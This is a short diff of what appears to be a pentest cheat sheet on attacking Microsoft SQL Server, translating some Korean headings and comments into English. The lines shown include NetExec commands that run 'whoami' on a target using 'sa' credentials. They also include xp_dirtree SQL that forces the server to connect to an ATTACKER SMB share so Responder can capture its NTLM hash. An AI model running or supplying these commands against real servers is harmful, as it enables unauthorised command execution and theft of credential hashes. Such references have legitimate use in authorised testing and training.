@@ -90,10 +90,10 @@ nxc mssql TARGET -u sa -p pass -x "whoami"
 nxc mssql TARGET -u sa -p pass -x "whoami" --no-output
 ```
 
-### NTLM 해시 캡처 (xp_dirtree)
+### NTLM hash capture (xp_dirtree)
 
 ```sql
--- SMB 요청 강제 → Responder로 해시 캡처
+-- SMB 요청 강제 → Responder로 hash capture
 EXEC xp_dirtree '\\ATTACKER\share';
 EXEC master.dbo.xp_dirtree '\\ATTACKER\share';
 
